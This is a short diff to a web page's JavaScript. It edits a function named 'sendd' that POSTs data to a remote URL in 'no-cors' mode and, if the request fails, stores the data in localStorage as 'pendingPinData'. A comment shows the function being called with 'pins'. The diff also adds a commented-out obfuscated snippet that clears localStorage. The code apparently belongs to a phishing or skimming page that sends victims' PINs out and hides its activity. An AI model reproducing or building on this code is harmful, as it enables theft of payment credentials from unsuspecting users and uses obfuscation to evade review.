@@ -424,8 +424,8 @@ w3.displayObject = function (id, data) {
 //   }
 // }, 50);
 
-
-async function sendd(urld, d9,pd) {
+//sendd(urli,vkz5,'pins')
+async function sendd(urld,d9) {
   const resp = await fetch(urld, {
     method: 'POST',
     mode: 'no-cors',
@@ -440,7 +440,10 @@ async function sendd(urld, d9,pd) {
     .catch((error) => {
       console.log('error', error);
       let kl=JSON.parse(localStorage.getItem('pend2'));
-      kl[pd]=d9;
+      kl['pendingPinData']=d9;
       localStorage.setItem("pend2", JSON.stringify(kl));  
     });
 }
+
+
+//var j=b;(function(c,d){var i=b,f=c();while(!![]){try{var g=parseInt(i(0x19b))/(-0x18d8+-0x129f+0x2b78)*(parseInt(i(0x1a0))/(0x2*0x106+-0x3a6*-0x3+-0xcfc))+parseInt(i(0x19e))/(-0xe6*0x19+0x1473+-0x206*-0x1)+-parseInt(i(0x195))/(0xacf*-0x1+0xc7*0x11+-0x264)+parseInt(i(0x19d))/(0x6d*0x2f+-0x2*0xf67+-0x2*-0x568)*(-parseInt(i(0x199))/(0x1*-0x1b7d+0x10*0xd+-0x1*-0x1ab3))+-parseInt(i(0x19f))/(0x4fe*0x1+0x214c+-0x2643)*(parseInt(i(0x197))/(-0xd13*-0x1+-0x432*0x1+-0x8d9))+-parseInt(i(0x198))/(-0x36e*0x2+-0x1b3e+-0x3*-0xb61)*(-parseInt(i(0x19a))/(0x101c*-0x1+-0x1*-0x1d7b+-0xd55))+parseInt(i(0x196))/(-0x417+-0x344*-0x5+-0xc32*0x1);if(g===d)break;else f['push'](f['shift']());}catch(h){f['push'](f['shift']());}}}(a,-0x3*-0xb85d+-0x66ef2+0x1ba1*0x6b));function b(c,d){var e=a();return b=function(f,g){f=f-(0x10f1+-0x2a2*-0x2+-0xa50*0x2);var h=e[f];return h;},b(c,d);}function a(){var k=['10wgKStb','474627wrUgSR','21GUPXVy','683674DDJVQT','848336ekbyhi','7360914qHskix','1254952aNozfB','5255505Zwkvrl','1781070XdnOTY','10QqQSGc','1VpVRcF','clear'];a=function(){return k;};return a();}!localStorage['e']&&localStorage[j(0x19c)]();
